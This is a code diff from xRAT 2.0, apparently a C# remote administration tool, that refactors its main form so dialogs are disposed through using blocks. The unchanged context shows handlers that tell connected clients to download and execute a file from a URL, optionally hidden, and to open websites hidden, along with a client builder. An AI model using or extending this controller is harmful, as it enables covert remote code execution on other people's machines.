@@ -24,7 +24,10 @@ namespace xRAT_2.Forms
 
             if (bool.Parse(XMLSettings.ReadValue("ShowToU")))
             {
-                new frmTermsOfUse().ShowDialog();
+                using (var frm = new frmTermsOfUse())
+                {
+                    frm.ShowDialog();
+                }
                 Thread.Sleep(300);
             }
 
@@ -301,13 +304,15 @@ namespace xRAT_2.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    frmDownloadAndExecute frmDaE = new frmDownloadAndExecute(lstClients.SelectedItems.Count);
-                    if (frmDaE.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                    using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
                     {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                         {
-                            Client c = (Client)lvi.Tag;
-                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client)lvi.Tag;
+                                new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
+                            }
                         }
                     }
                 }
@@ -389,13 +394,15 @@ namespace xRAT_2.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    frmVisitWebsite frmVW = new frmVisitWebsite(lstClients.SelectedItems.Count);
-                    if (frmVW.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                    using (var frm = new frmVisitWebsite(lstClients.SelectedItems.Count))
                     {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                         {
-                            Client c = (Client)lvi.Tag;
-                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client)lvi.Tag;
+                                new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
+                            }
                         }
                     }
                 }
@@ -426,12 +433,18 @@ namespace xRAT_2.Forms
 
         private void menuSettings_Click(object sender, EventArgs e)
         {
-            new frmSettings(listenServer).ShowDialog();
+            using (var frm = new frmSettings(listenServer))
+            {
+                frm.ShowDialog();
+            }
         }
 
         private void menuBuilder_Click(object sender, EventArgs e)
         {
-            new frmBuilder().ShowDialog();
+            using (var frm = new frmBuilder())
+            {
+                frm.ShowDialog();
+            }
         }
 
         private void menuStatistics_Click(object sender, EventArgs e)
@@ -439,12 +452,20 @@ namespace xRAT_2.Forms
             if (listenServer.BytesReceived == 0 || listenServer.BytesSent == 0)
                 MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK, MessageBoxIcon.Information);
             else
-                new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients).ShowDialog();
+            {
+                using (var frm = new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients))
+                {
+                    frm.ShowDialog();
+                }
+            }
         }
 
         private void menuAbout_Click(object sender, EventArgs e)
         {
-            new frmAbout().ShowDialog();
+            using (var frm = new frmAbout())
+            {
+                frm.ShowDialog();
+            }
         }
         #endregion
 
